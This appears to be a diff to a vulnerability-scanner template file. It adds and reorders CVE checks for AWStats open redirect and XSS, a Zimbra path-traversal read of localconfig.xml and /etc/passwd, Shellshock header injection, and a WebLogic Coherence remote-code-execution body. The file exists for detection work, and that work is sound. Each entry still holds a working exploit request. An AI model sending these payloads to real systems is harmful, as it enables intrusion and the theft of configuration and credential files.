@@ -518,6 +518,22 @@
       ]
     },
     {
+      "id": "CVE-2009-5020",
+      "info": {
+        "name": "AWStats < 6.95 - Open redirect",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/awstats/awredir.pl?url=example.com",
+            "{{BaseURL}}/cgi-bin/awstats/awredir.pl?url=example.com"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2009-5114",
       "info": {
         "name": "WebGlimpse 2.18.7 - Directory Traversal",
@@ -2604,6 +2620,22 @@
       ]
     },
     {
+      "id": "CVE-2012-4547",
+      "info": {
+        "name": "AWStats 6.95/7.0 - 'awredir.pl' Cross-Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/awstats/awredir.pl?url=%3Cscript%3Ealert(document.domain)%3C/script%3E",
+            "{{BaseURL}}/cgi-bin/awstats/awredir.pl?url=%3Cscript%3Ealert(document.domain)%3C/script%3E"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2012-4768",
       "info": {
         "name": "WordPress Plugin Download Monitor < 3.3.5.9 - Reflected Cross-Site Scripting (XSS)",
@@ -2839,6 +2871,22 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/index.php?p=../../../../../../../../../../../../../../../../etc/passwd%00index&q=About&ajax=true&_=1355714673828"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2013-7091",
+      "info": {
+        "name": "Zimbra Collaboration Server 7.2.2/8.0.2 LFI",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../../opt/zimbra/conf/localconfig.xml%00",
+            "{{BaseURL}}/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../../etc/passwd%00"
           ]
         }
       ]
@@ -3229,9 +3277,9 @@
       "requests": [
         {
           "headers": {
-            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -9360,8 +9408,8 @@
         {
           "body": "test_handle=com.tangosol.coherence.mvel2.sh.ShellSession('weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField(\"connectionHandler\");field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(\"getServletRequest\").invoke(obj); String cmd = req.getHeader(\"Test-Header\");String[] cmds = System.getProperty(\"os.name\").toLowerCase().contains(\"window\") ? new String[]{\"cmd.exe\", \"/c\", cmd} : new String[]{\"/bin/sh\", \"-c\", cmd};if(cmd != null ){ String result = new java.util.Scanner(new java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(\"\\\\A\").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(\"getResponse\").invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();} currentThread.interrupt();')\n",
           "headers": {
-            "Content-Type": "application/x-www-form-urlencoded",
-            "Test-Header": "cat /etc/passwd"
+            "Test-Header": "cat /etc/passwd",
+            "Content-Type": "application/x-www-form-urlencoded"
           },
           "method": "POST",
           "path": [
